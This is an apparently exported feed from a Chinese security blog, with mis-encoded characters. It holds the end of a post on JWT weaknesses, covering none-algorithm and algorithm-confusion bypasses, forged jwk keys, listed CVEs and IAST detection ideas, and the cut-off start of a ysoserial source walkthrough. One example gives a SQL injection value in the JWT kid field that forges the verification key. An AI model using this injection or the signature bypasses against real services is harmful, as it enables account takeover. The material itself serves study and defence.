&lt;p&gt;ç”±äºJWTçš„å‰ä¸¤ä¸ªå­—æ®µ&lt;code&gt;header&lt;/code&gt;å’Œ&lt;code&gt;payload&lt;/code&gt;å¹¶æ²¡æœ‰è¿›è¡ŒåŠ å¯†ï¼Œæ‰€ä»¥ç›´æ¥ä½¿ç”¨&lt;code&gt;base64url&lt;/code&gt;è¿›è¡Œè§£ç å°±å¯ä»¥è·å¾—ç›¸åº”çš„ä¿¡æ¯ï¼Œè¿™å°±å¯èƒ½ä¼šé€ æˆæ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œå½“ç„¶æ˜¯å¦æœ‰æ•æ„Ÿä¿¡æ¯è¿˜éœ€è¦çœ‹å¯¹åº”çš„å¼€å‘è€…æœ‰æ²¡æœ‰å¾€é‡Œé¢æ”¾å°±æ˜¯äº†ã€‚&lt;/p&gt;
&lt;h3&gt;noneç­¾åæ–¹æ³•&lt;/h3&gt;
&lt;p&gt;è¿™ä¸ªæ¼æ´åº”è¯¥ä¸ä¼šå†å‡ºç°äº†ï¼Œjavaä¸­æœ‰ä¸ªä¾èµ–å«ä»€ä¹ˆå…·ä½“å¿˜è®°äº†ï¼Œå…¶å®è°ƒè¯•è¿‡ç¨‹è¿˜è›®å¤æ‚çš„æ‰€ä»¥å°±ä¸ä¸Šè°ƒè¯•æµç¨‹äº†ã€‚
æ¼æ´çš„æˆå› æ˜¯å› ä¸ºåœ¨ç­¾åçš„ç”Ÿæˆè¿‡ç¨‹ä¸­å…è®¸äº†ä½¿ç”¨&lt;code&gt;none&lt;/code&gt;ä½œä¸ºç­¾åç®—æ³•ï¼Œå½“ç­¾åç®—æ³•ä¸º&lt;code&gt;none&lt;/code&gt;çš„æ—¶å€™ï¼Œåªéœ€è¦ä½¿ç”¨&lt;code&gt;base64url&lt;/code&gt;ç¼–ç &lt;code&gt;header&lt;/code&gt;å’Œ&lt;code&gt;payload&lt;/code&gt;å¹¶ç”¨&lt;code&gt;.&lt;/code&gt;åˆ†å‰²ï¼Œå°±å¯ä»¥ç»•è¿‡åŸæœ¬çš„ç­¾åæ£€æµ‹ï¼Œè¾¾åˆ°æƒé™è·å–çš„ç›®çš„ã€‚&lt;/p&gt;
&lt;h3&gt;ç­¾åæœªæ ¡éªŒ&lt;/h3&gt;
&lt;p&gt;åœ¨fusionauth-jwt 1.3.0ä»¥å‰ï¼Œè¯¥ç»„ä»¶å³ä½¿åˆ é™¤äº†&lt;code&gt;JWT&lt;/code&gt;åœ°ç­¾åéƒ¨åˆ†ä»ç„¶å¯ä»¥é€šè¿‡éªŒè¯ã€‚&lt;/p&gt;
&lt;h3&gt;ä¸å½“çš„é”™è¯¯å¤„ç†&lt;/h3&gt;
&lt;p&gt;åœ¨CVE-2019-7644ä¸­ï¼Œå¦‚æœä½ å‘é€çš„ç­¾åæ˜¯é”™çš„ï¼Œé‚£ä¹ˆæœåŠ¡å™¨ä¼šé€šçŸ¥ä½ ç­¾åé”™è¯¯ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ­£ç¡®çš„ç­¾åï¼ˆä½ äººè¿˜æ€ªå¥½çš„å˜ï¼‰ã€‚&lt;/p&gt;
&lt;h3&gt;ç ´è§£å¯†é’¥&lt;/h3&gt;
&lt;p&gt;çŒœæ‚¨æ˜¯å¦åœ¨æ‰¾ï¼š
&lt;a href=&quot;https://github.com/hashcat/hashcat&quot;&gt;https://github.com/hashcat/hashcat&lt;/a&gt;
&lt;a href=&quot;https://github.com/Ch1ngg/JWTPyCrack&quot;&gt;https://github.com/Ch1ngg/JWTPyCrack&lt;/a&gt;
&lt;a href=&quot;https://github.com/brendan-rius/c-jwt-cracker&quot;&gt;https://github.com/brendan-rius/c-jwt-cracker&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;æ›´æ”¹åŠ å¯†ç®—æ³•&lt;/h3&gt;
&lt;p&gt;åœ¨CVE-2016-10555ä¸­ï¼Œjwt-simple &amp;lt; 0.3.0ç‰ˆæœ¬ï¼Œå¦‚æœå°†&lt;code&gt;header&lt;/code&gt;ä¸­çš„ç­¾åç®—æ³•ç”±&lt;code&gt;RS256&lt;/code&gt;æ”¹ä¸º&lt;code&gt;HS256&lt;/code&gt;é‚£ä¹ˆå°±ä¼šæ‰§è¡Œå¯¹ç§°åŠ å¯†è§£å¯†ç®—æ³•ï¼Œå°†&lt;code&gt;RS256&lt;/code&gt;çš„å…¬é’¥ç”¨ä½œå¯¹ç§°è§£å¯†å½“ä¸­ã€‚&lt;/p&gt;
&lt;h3&gt;ä¼ªé€ å¯†é’¥&lt;/h3&gt;
&lt;p&gt;åœ¨CVE-2018-0114ä¸­ï¼Œé€šè¿‡å‰æ–‡è¯´åˆ°çš„&lt;code&gt;header&lt;/code&gt;ä¸­çš„&lt;code&gt;jwk&lt;/code&gt;å­—æ®µå¯ä»¥ä¼ªé€ å…¬é’¥ï¼ˆè‡ªå·±ç”Ÿæˆçš„ï¼‰ï¼Œç„¶åç”¨å¯¹åº”çš„ç§é’¥è¿›è¡ŒåŠ å¯†æ“ä½œå¹¶å‘é€ï¼Œå¯¹æ–¹å°±ä¼šä½¿ç”¨ä¼ è¾“çš„å…¬é’¥æ¥è¿›è¡Œè§£å¯†ï¼Œç»•è¿‡å®‰å…¨è®¤è¯ã€‚&lt;/p&gt;
&lt;h3&gt;ç¡¬ç¼–ç &lt;/h3&gt;
&lt;p&gt;å°¤å…¶æ˜¯å¯¹äºå¼€æºé¡¹ç›®ï¼Œå¦‚æœä½¿ç”¨äº†ç¡¬ç¼–ç å­˜å‚¨å…¬é’¥ç§é’¥ï¼Œå¹¶ä¸”å¼€å‘è€…ä½¿ç”¨äº†é»˜è®¤çš„ç¡¬ç¼–ç ç§é’¥ï¼Œé‚£ä¹ˆå°±ä¼šç ´ååŸæœ¬çš„èº«ä»½éªŒè¯æœºåˆ¶ã€‚&lt;/p&gt;
&lt;h3&gt;headerä¸­webå®‰å…¨é—®é¢˜&lt;/h3&gt;
&lt;p&gt;å¸¸è§çš„æ˜¯&lt;code&gt;header&lt;/code&gt;ä¸­çš„&lt;code&gt;kid&lt;/code&gt;å­—æ®µï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç”±äº&lt;code&gt;kid&lt;/code&gt;é€šå¸¸ç”¨äºä»æ–‡ä»¶ç³»ç»Ÿæ£€ç´¢å¯†é’¥æ–‡ä»¶ï¼Œå› æ­¤å¦‚æœåœ¨ä½¿ç”¨å‰æœªå¯¹å…¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯èƒ½ä¼šå¯¼è‡´ç›®å½•éå†æ”»å‡»ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å°†èƒ½å¤ŸæŒ‡å®šæ–‡ä»¶ç³»ç»Ÿä¸­çš„ä»»ä½•æ–‡ä»¶ä½œä¸ºç”¨äºéªŒè¯ä»¤ç‰Œçš„å¯†é’¥ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;kid&lt;/code&gt;è¿˜å¯ç”¨äºä»æ•°æ®åº“æ£€ç´¢å¯†é’¥ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥åˆ©ç”¨ SQL æ³¨å…¥æ¥ç»•è¿‡ JWT ç­¾åã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¦‚æœ&lt;code&gt;kid&lt;/code&gt;å‚æ•°ä¸Šå¯ä»¥è¿›è¡Œ SQL æ³¨å…¥ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥ä½¿ç”¨æ­¤æ³¨å…¥è¿”å›ä»»ä½•å€¼ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sqlæ³¨å…¥â€œkidâ€ï¼šâ€œaaaaaaa&apos; UNION SELECT &apos;key&apos;;--â€
// ä½¿ç”¨å­—ç¬¦ä¸²â€œkeyâ€æ¥éªŒè¯ä»¤ç‰Œ
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¾‹å¦‚ï¼Œä¸Šé¢çš„æ³¨å…¥å°†å¯¼è‡´åº”ç”¨ç¨‹åºè¿”å›å­—ç¬¦ä¸²&lt;code&gt;key&lt;/code&gt;ï¼Œç„¶åå°†ä½¿ç”¨å­—ç¬¦ä¸²&lt;code&gt;key&lt;/code&gt;ä½œä¸ºå¯†é’¥æ¥éªŒè¯ä»¤ç‰Œã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å¦‚æœ&lt;code&gt;kid&lt;/code&gt;çš„å€¼è¢«æ‹¼æ¥åˆ°å‘½ä»¤ä¸­ç”¨æ¥è¯»å–æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½äº§ç”Ÿå’Œ&lt;code&gt;web&lt;/code&gt;ä¸­å…¶ä»–å†…å®¹åŒæ ·ä¼šäº§ç”Ÿçš„å‘½ä»¤æ³¨å…¥ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;æ¼æ´è¿‘å†µ&lt;/h2&gt;
&lt;p&gt;è°·æ­Œæœç´¢äº†ä¸€ä¸‹æ„Ÿè§‰JWTå¼•å‘çš„é—®é¢˜è¿˜æ˜¯è›®å¤šçš„ï¼Œæ¯”å¦‚ï¼š
ç¡¬ç¼–ç çš„CVE-2023-5074ã€CVE-2023-33236è¿™ä¸¤ä¸ªæ¼æ´å¯ä»¥é€šè¿‡ç¡¬ç¼–ç çš„å¯†é’¥ä¼ªé€ ä»»æ„JWT
JWTæŠ¥é”™äº§ç”Ÿçš„CVE-2023-40171å’Œå‰é¢è¯´çš„&lt;code&gt;ä¸å½“çš„é”™è¯¯å¤„ç†&lt;/code&gt;ä¸€æ ·ï¼Œå½“ä½ ä¼ è¾“äº†é”™è¯¯çš„å†…å®¹æ—¶ä¼šè¿”å›ç»™ä¸€ä¸ªæ­£ç¡®ç­¾åçš„JWT
å› ä¸ºéªŒè¯ä¸å½“å¯¼è‡´çš„CVE-2023â€“4696å±äºå‰é¢è¯´çš„&lt;code&gt;ç­¾åæœªæ ¡éªŒ&lt;/code&gt;ç±»å‹ï¼Œä¿®æ”¹&lt;code&gt;payload&lt;/code&gt;ä¸­çš„æ˜æ–‡ä¿¡æ¯å°±å¯ä»¥ç»•è¿‡æƒé™æ£€æŸ¥
å› ä¸ºè¾“å…¥è¿‡æ»¤ä¸å½“å¯¼è‡´çš„CVE-2022-23529ï¼Œè¯¥æ¼æ´å…è®¸é€šè¿‡JWTé‡å†™&lt;code&gt;toString&lt;/code&gt;æ–¹æ³•é€ æˆRCEï¼ˆä¸è¿‡ä½œè€…æœ¬äººä¼¼ä¹è¯´ä¸èƒ½RCEï¼Œåªèƒ½æœ¬åœ°åˆ©ç”¨ï¼Œè¿™é‡Œè´´ä¸ªå›¾ï¼‰
&lt;img src=&quot;./%E6%B5%85%E8%B0%88JWT%E5%AE%89%E5%85%A8/image-20231122014756560.png&quot; alt=&quot;image-20231122014756560&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;IASTçš„æ£€æµ‹&lt;/h2&gt;
&lt;p&gt;å¯¹äºä½¿ç”¨IASTæ£€æµ‹JWTé—®é¢˜æƒ³äº†ä¸€å¤©ä¹Ÿæ²¡ä»€ä¹ˆé€šç”¨çš„å¤´ç»ªï¼ŒDongTaiè€å¤§å“¥çš„ä»£ç ä¸­è²Œä¼¼ä¹Ÿæ²¡çœ‹åˆ°ä»€ä¹ˆæœ‰ç”¨çš„å†…å®¹ï¼Œè®°å½•ä¸‹è‡ªå·±çš„æ€è€ƒå§ã€‚&lt;/p&gt;
&lt;h4&gt;JWTç”Ÿæˆç‚¹&lt;/h4&gt;
&lt;p&gt;æ¡©ç‚¹ï¼šå¯»æ‰¾ä»£ç ä¸­ç”ŸæˆJWTçš„éƒ¨åˆ†ï¼Œé€šå¸¸æ˜¯åœ¨ç”¨æˆ·è®¤è¯æˆåŠŸåã€‚
å®æ–½æ–¹æ¡ˆï¼šåœ¨è¿™äº›ç‚¹æ’å…¥ä»£ç ï¼Œç”¨ä»¥æ£€æŸ¥æ‰€ä½¿ç”¨çš„ç®—æ³•ï¼ˆé¿å…Noneï¼‰ï¼Œç¡®ä¿å¯†é’¥çš„å¼ºåº¦å’Œå®‰å…¨æ€§ã€‚åŒæ—¶ï¼Œè®°å½•ç”Ÿæˆçš„JWTï¼Œä»¥ä¾¿äºåç»­å®¡è®¡ã€‚&lt;/p&gt;
&lt;h4&gt;JWTè§£æä¸éªŒè¯ç‚¹&lt;/h4&gt;
&lt;p&gt;æ¡©ç‚¹ï¼šæ‰¾åˆ°è§£æå’ŒéªŒè¯JWTçš„éƒ¨åˆ†ï¼Œé€šå¸¸æ˜¯åœ¨APIè®¿é—®æ§åˆ¶æˆ–ç”¨æˆ·ä¼šè¯ç®¡ç†ä¸­ã€‚
å®æ–½æ–¹æ¡ˆï¼šåœ¨JWTè§£æå’ŒéªŒè¯çš„ä»£ç å¤„æ’å…¥æ£€æµ‹é€»è¾‘ï¼Œç¡®ä¿ç­¾åçš„æœ‰æ•ˆæ€§ï¼Œé˜²æ­¢ä¼ªé€ æˆ–ç¯¡æ”¹ã€‚åŒæ—¶ï¼Œæ£€æŸ¥è´Ÿè½½ä¸­çš„æ ‡å‡†å£°æ˜ï¼Œå¦‚è¿‡æœŸæ—¶é—´ï¼ˆexpï¼‰ã€ä¸»é¢˜ï¼ˆsubï¼‰ç­‰ã€‚&lt;/p&gt;
&lt;h4&gt;é”™è¯¯å¤„ç†ä¸æ—¥å¿—è®°å½•&lt;/h4&gt;
&lt;p&gt;æ¡©ç‚¹ï¼šåœ¨å¤„ç†JWTç›¸å…³å¼‚å¸¸çš„åœ°æ–¹ï¼Œå¦‚ç­¾åéªŒè¯å¤±è´¥ã€ä»¤ç‰Œè¿‡æœŸç­‰ã€‚
å®æ–½æ–¹æ¡ˆï¼šå¢å¼ºé”™è¯¯å¤„ç†é€»è¾‘ï¼Œè®°å½•æ‰€æœ‰å¤±è´¥çš„JWTéªŒè¯å°è¯•ï¼ŒåŒ…æ‹¬ä»¤ç‰Œä¿¡æ¯å’Œç›¸å…³çš„è®¿é—®ä¸Šä¸‹æ–‡ï¼Œä»¥ä¾¿äºå®‰å…¨åˆ†æã€‚&lt;/p&gt;
&lt;h4&gt;æ•æ„Ÿä¿¡æ¯æ³„éœ²æ£€æµ‹&lt;/h4&gt;
&lt;p&gt;æ¡©ç‚¹ï¼šåœ¨JWTçš„payloadåˆ›å»ºè¿‡ç¨‹ä¸­ã€‚
å®æ–½æ–¹æ¡ˆï¼šç¡®ä¿JWTçš„è´Ÿè½½ä¸­ä¸å«æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚ç”¨æˆ·å¯†ç ã€ä¸ªäººèº«ä»½ä¿¡æ¯ç­‰ã€‚å¯ä»¥åœ¨è¿™ä¸€ç‚¹ä¸Šæ’å…¥ä»£ç ï¼Œè‡ªåŠ¨æ£€æµ‹å’Œè­¦å‘Šä»»ä½•å¯èƒ½çš„æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚&lt;/p&gt;
&lt;h2&gt;ç»“è¯­&lt;/h2&gt;
&lt;p&gt;å› ä¸ºåªæ˜¯æƒ³æ¦‚æ‹¬æ€§åœ°äº†è§£JWTçš„å®‰å…¨é—®é¢˜ï¼Œæ‰€ä»¥å¯¹äºå…¶ä¸­çš„ä»£ç æˆ‘ä¹Ÿå¹¶æ²¡æœ‰è¿›è¡Œè°ƒè¯•ï¼Œåªæ˜¯æƒ³ç»™è‡ªå·±ç•™ä¸ªå°è±¡æ–¹ä¾¿éœ€è¦çš„æ—¶å€™åŠæ—¶å›å¿†èµ·æ¥ï¼Œå¯¹äºJWTæ¥è¯´ï¼Œå­˜åœ¨çš„å®‰å…¨é—®é¢˜ä¼¼ä¹å’Œåº“ä»¥åŠç»„ä»¶å¼€å‘è€…å¼€å‘æ—¶çš„æ¸…é†’ç¨‹åº¦æœ‰ç›´æ¥å…³è”ï¼ˆè¿™ä¹ˆè¯´å¥½åƒæœ‰ç‚¹å¥‡æ€ªï¼‰ã€‚åŒæ—¶å¯¹äºä½¿ç”¨è€…æ¥è¯´ï¼Œåœ¨JWTä¸­å­˜æ”¾ä½•ç§ä¿¡æ¯ã€ä½¿ç”¨ä»€ä¹ˆåè®®ä¼ è¾“ä»¥åŠåœ¨æ¥æ”¶æ—¶æ˜¯å¦å¢åŠ ä¸€äº›å¿…è¦çš„è¿‡æ»¤éƒ½æ˜¯éœ€è¦è€ƒè™‘çš„åœ°æ–¹ã€‚
å…³äºJWTè¿˜æœ‰å¾ˆå¤šéœ€è¦å­¦ä¹ çš„ï¼Œçœ‹æœ¬æ–‡çæ‰¯ä¸€é€šåï¼Œå¸Œæœ›è¯»è€…å¯¹JWTå®‰å…¨æœ‰ä¸€ä¸ªå¤§è‡´æ¨¡ç³Šçš„äº†è§£ã€‚
å‚è€ƒé“¾æ¥ï¼š
&lt;a href=&quot;https://research.securitum.com/jwt-json-web-token-security/&quot;&gt;https://research.securitum.com/jwt-json-web-token-security/&lt;/a&gt;
&lt;a href=&quot;https://www.authing.cn/blog/306&quot;&gt;https://www.authing.cn/blog/306&lt;/a&gt;
&lt;a href=&quot;https://version-2.com/en/2023/01/jwt-arbitrary-command-execution-cve-2022-23529/&quot;&gt;https://version-2.com/en/2023/01/jwt-arbitrary-command-execution-cve-2022-23529/&lt;/a&gt;
&lt;a href=&quot;https://medium.com/@mnqazi/cve-2023-4696-account-takeover-due-to-improper-handling-of-jwt-tokens-in-memos-v0-13-2-13104e1412f3&quot;&gt;https://medium.com/@mnqazi/cve-2023-4696-account-takeover-due-to-improper-handling-of-jwt-tokens-in-memos-v0-13-2-13104e1412f3&lt;/a&gt;
&lt;a href=&quot;https://www.cnblogs.com/tomyyyyy/p/15134420.html&quot;&gt;https://www.cnblogs.com/tomyyyyy/p/15134420.html&lt;/a&gt;&lt;/p&gt;
</content:encoded></item><item><title>ysoserialæºç è¯¦è§£</title><link>https://www.springkill.club/posts/ysoserial%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3/</link><guid isPermaLink="true">https://www.springkill.club/posts/ysoserial%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3/</guid><pubDate>Sun, 12 Nov 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;IASTåç«¯åŸºæœ¬å†™çš„å·®ä¸å¤šäº†ï¼Œæ‰€ä»¥ä¸ºäº†å†™å‰ç«¯ï¼Œæœ€è¿‘æ­£åœ¨å­¦ä¹ electronï¼Œæƒ³å…ˆæ‹¿ä¸ªä¸œè¥¿ç»ƒç»ƒæ‰‹ï¼Œäºæ˜¯æ‰“ç®—ä¸ºysoserialåšä¸€ä¸ªå‰ç«¯ç•Œé¢åŒæ—¶åŠ ä¸€äº›è‡ªå·±çš„ç‰¹æ€§ï¼Œé‚£ä¹ˆæ—¢ç„¶è¦äºŒå¼€å¿…ç„¶è¦å­¦ä¹ åŸé¡¹ç›®ï¼Œé‚£ä¹ˆé¡ºæ‰‹å†™ä¸ªæ–‡ç« æ–¹ä¾¿ä»¥åå¤ä¹ ã€‚&lt;/p&gt;
&lt;h1&gt;ä»£ç ç»“æ„&lt;/h1&gt;
&lt;p&gt;ysorerialçš„ä»£ç ç»“æ„å¦‚ä¸‹ï¼ŒåŒ…æ‹¬è¿™ä¸‰ä¸ªå—ï¼š
&lt;code&gt;exploit&lt;/code&gt;ã€&lt;code&gt;payloads&lt;/code&gt;ã€&lt;code&gt;secmgr&lt;/code&gt;
&lt;img src=&quot;./ysoserial%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3/image-20231112221449710.png&quot; alt=&quot;image-20231112221449710&quot; /&gt;
ä¸‹é¢æ¥ç®€å•ä»‹ç»ä¸€ä¸‹æ¯ä¸ªå—çš„å…·ä½“ç”¨é€”ã€‚&lt;/p&gt;
&lt;h2&gt;exploitåŒ…&lt;/h2&gt;
&lt;p&gt;è¿™ä¸ªåŒ…å†…çš„å†…å®¹ä¸»è¦ç”¨äºå¯¹ä¸åŒçš„ç›®æ ‡è¿›è¡Œå®é™…çš„æ”»å‡»ã€‚&lt;/p&gt;
&lt;h2&gt;payloadsåŒ…&lt;/h2&gt;
&lt;h3&gt;annnotationåŒ…&lt;/h3&gt;
&lt;p&gt;è¿™ä¸ªåŒ…å†…ä¸»è¦åŒ…å«äº†ä¸€äº›æ³¨è§£ç›¸å…³çš„ä¿¡æ¯ï¼Œä¸»è¦ç”¨åŠ›æ ‡è¯†ä½œè€…ä¹‹ç±»çš„æç¤ºä¿¡æ¯ã€‚&lt;/p&gt;
&lt;h4&gt;Authorsæ³¨è§£&lt;/h4&gt;
&lt;p&gt;è¿™ä¸ªæ–‡ä»¶å®šä¹‰äº†ä¸€ä¸ªæ³¨è§£ï¼Œå…¶ä¸­åŒ…å«äº†ä¸€äº›ä½œè€…ä¿¡æ¯ï¼Œæ˜¯ç”¨æ¥æ ‡è®°gadgateçš„ä½œè€…çš„ï¼Œæ²¡ä»€ä¹ˆç‰¹åˆ«å¥½è¯´çš„ã€‚&lt;/p&gt;
&lt;h4&gt;Dependenciesæ³¨è§£&lt;/h4&gt;
&lt;p&gt;æ£€ç´¢ä¾èµ–ä¿¡æ¯çš„æ³¨è§£ã€‚&lt;/p&gt;
&lt;h4&gt;PayloadTestæ³¨è§£&lt;/h4&gt;
&lt;p&gt;ç”¨æ¥æ ‡è®°gadgateæ˜¯å¦éœ€è¦è¢«æµ‹è¯•ï¼Œæ˜¯å¦æµ‹è¯•çš„æ—¶å€™ä¼šå¼•å‘ä»€ä¹ˆå¼‚å¸¸æƒ…å†µä¹‹ç±»çš„ä¸œè¥¿ï¼Œæ˜¯ç”¨æ¥æµ‹è¯•gadgateçš„ã€‚&lt;/p&gt;
&lt;h3&gt;UtilåŒ…&lt;/h3&gt;
&lt;p&gt;Utilæ¨¡å—æ˜¯ä¸€ä¸ªå·¥å…·æ¨¡å—ï¼Œé‡Œé¢åŒ…å«äº†åƒç±»æ–‡ä»¶æ“ä½œï¼Œåå°„æ“ä½œç­‰çš„å°å·¥å…·ï¼Œä¸ºysoä¸­å¤§é‡ä½¿ç”¨çš„é‡å¤æ€§æ“ä½œåšä¸€ä¸ªå°è£…ã€‚&lt;/p&gt;
&lt;h4&gt;ClassFilesç±»&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;ClassFiles&lt;/code&gt;ç±»çš„ä½œç”¨æ˜¯å¤„ç†ç±»æ–‡ä»¶ï¼Œåœ¨&lt;code&gt;ysoserial&lt;/code&gt;ä¸­ç»å¸¸ä¼šæ¶‰åŠåˆ°ç±»æ–‡ä»¶è¯»å–çš„æ“ä½œï¼Œå› æ­¤å°†å…¶æ”¾åœ¨äº†ä¸€ä¸ªå•ç‹¬çš„ç±»é‡Œé¢æ–¹ä¾¿ä½¿ç”¨ï¼Œè¯¦ç»†è¯´è¯´å…¶ä¸­çš„å„ç§æ–¹æ³•ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;classAsFile&lt;/code&gt;æ–¹æ³•&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;public static String classAsFile(final Class&amp;lt;?&amp;gt; clazz) {
		return classAsFile(clazz, true);
	}
	
	public static String classAsFile(final Class&amp;lt;?&amp;gt; clazz, boolean suffix) {
		String str;
		if (clazz.getEnclosingClass() == null) {
			str = clazz.getName().replace(&quot;.&quot;, &quot;/&quot;);
		} else {
			str = classAsFile(clazz.getEnclosingClass(), false) + &quot;$&quot; + clazz.getSimpleName();
		}
		if (suffix) {
			str += &quot;.class&quot;;			
		}
		return str;  
	}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;classAsFile&lt;/code&gt;æ–¹æ³•æœ‰ä¸¤ä¸ªé‡è½½ï¼Œæ€»çš„æ¥è¯´æ˜¯è·å–&lt;code&gt;class&lt;/code&gt;çš„è·¯å¾„ç”¨çš„ï¼Œè¿™ä¸ªæ–¹æ³•åœ¨å¤„ç†åå°„ã€ç±»åŠ è½½å™¨ã€æˆ–è€…éœ€è¦æ ¹æ®ç±»åè·å–ç±»æ–‡ä»¶è·¯å¾„çš„åœºæ™¯ä¸­éå¸¸æœ‰ç”¨ã€‚ä¾‹å¦‚ï¼Œåœ¨è‡ªå®šä¹‰ç±»åŠ è½½å™¨æˆ–è¿›è¡Œå­—èŠ‚ç åˆ†ææ—¶ï¼Œè¿™ç§å°†ç±»åè½¬æ¢ä¸ºç±»æ–‡ä»¶è·¯å¾„çš„åŠŸèƒ½æ˜¯éå¸¸åŸºç¡€ä¸”é‡è¦çš„ã€‚
ç¬¬äºŒä¸ªé‡è½½ä¹Ÿå°±æ˜¯æ ¸å¿ƒæ‰€åœ¨ï¼Œé€šè¿‡&lt;code&gt;getEnclosingClass()&lt;/code&gt;æ–¹æ³•è·å–ä¼ å…¥çš„æ˜¯å¦æ˜¯å†…éƒ¨ç±»ï¼Œå¦‚æœä¸æ˜¯é‚£ä¹ˆç›´æ¥è¿”å›å¦‚&lt;code&gt;com/springkill/clazz&lt;/code&gt;è¿™æ ·çš„å­—æ®µï¼Œå¦‚æœæ˜¯é‚£ä¹ˆå°±è¿”å›&lt;code&gt;com/springkill/clazz$1&lt;/code&gt;è¿™æ ·çš„å­—æ®µï¼Œç„¶åæ ¹æ®&lt;code&gt;suffix&lt;/code&gt;è¡¨ç¤ºçš„å†…å®¹åˆ¤æ–­åœ¨æœ«å°¾æ˜¯å¦åŠ ä¸Š&lt;code&gt;.class&lt;/code&gt;çš„åç¼€ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;classAsBytes&lt;/code&gt;æ–¹æ³•&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;public static byte[] classAsBytes(final Class&amp;lt;?&amp;gt; clazz) {
	try {
		final byte[] buffer = new byte[1024];
		final String file = classAsFile(clazz);
		final InputStream in = ClassFiles.class.getClassLoader().getResourceAsStream(file);
		if (in == null) {
			throw new IOException(&quot;couldn&apos;t find &apos;&quot; + file + &quot;&apos;&quot;);
		}
		final ByteArrayOutputStream out = new ByteArrayOutputStream();
		int len;
		while ((len = in.read(buffer)) != -1) {
			out.write(buffer, 0, len);
		}
		return out.toByteArray();
	} catch (IOException e) {
		throw new RuntimeException(e);
	}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™ä¸ªæ–¹æ³•å°±æ˜¯ç®€å•çš„å°†ç±»è½¬æ¢ä¸º&lt;code&gt;byte[]&lt;/code&gt;ä¾›åé¢ä½¿ç”¨ã€‚&lt;/p&gt;
&lt;h4&gt;Gadgetsç±»&lt;/h4&gt;
&lt;p&gt;æ€»çš„æ¥è¯´è¿™ä¸ªç±»åŒ…å«äº†å¤šä¸ªæ–¹æ³•ï¼Œä¸»è¦ç”¨äºåŠ¨æ€åˆ›å»ºå’Œæ“ä½œJavaå¯¹è±¡ã€‚
å…ˆè¯´ä¸¤ä¸ªå†…éƒ¨ç±»ï¼š&lt;/p&gt;
&lt;h5&gt;å†…éƒ¨ç±»ï¼šStubTransletPayloadç±»&lt;/h5&gt;
&lt;p&gt;è¿™ä¸ªå†…éƒ¨ç±»ç”¨äºæ¼”ç¤ºååºåˆ—åŒ–ï¼Œç»§æ‰¿è‡ª&lt;code&gt;AbstractTranslet&lt;/code&gt;ç±»ï¼Œå¹¶ä¸”å®ç°äº†&lt;code&gt;transform&lt;/code&gt;æ–¹æ³•ï¼Œä¸ºåé¢çš„æ“ä½œæä¾›ä¸€ä¸ªçœ‹èµ·æ¥æ— å®³çš„&quot;è½½ä½“&quot;ã€‚&lt;/p&gt;
&lt;h5&gt;å†…éƒ¨ç±»ï¼šFooç±»&lt;/h5&gt;
&lt;p&gt;å®šä¹‰äº†åºåˆ—åŒ–ç‰ˆæœ¬ï¼Œæ²¡æœ‰å¤šä½™æ“ä½œï¼Œåæ–‡å°†ä½œä¸ºè¾…åŠ©ç±»ä½¿ç”¨ã€‚&lt;/p&gt;
&lt;h5&gt;ç±»ä¸­çš„æ–¹æ³•&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;é™æ€ä»£ç å—åŒº&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;è¿™å—ä»£ç åˆå§‹åŒ–äº†ä¸¤ä¸ªç³»ç»Ÿå±æ€§åˆ†åˆ«å…è®¸&lt;code&gt;TemplatesImpl&lt;/code&gt;çš„ååºåˆ—åŒ–å’Œå…è®¸RMIè¿œç¨‹åŠ è½½ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;createMemoitizedProxy&lt;/code&gt;å’Œ&lt;code&gt;createProxy&lt;/code&gt;æ–¹æ³•&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;public static &amp;lt;T&amp;gt; T createMemoitizedProxy ( final Map&amp;lt;String, Object&amp;gt; map, final Class&amp;lt;T&amp;gt; iface, final Class&amp;lt;?&amp;gt;... ifaces ) throws Exception {
	return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
}

//åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰sun.reflect.annotation.AnnotationInvocationHandlerå®ä¾‹
public static InvocationHandler createMemoizedInvocationHandler ( final Map&amp;lt;String, Object&amp;gt; map ) throws Exception {
	return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
}

//åŠ¨æ€åˆ›å»ºä»£ç†ï¼Œå®ç°æ‰€æœ‰ç»™å®šæ¥å£
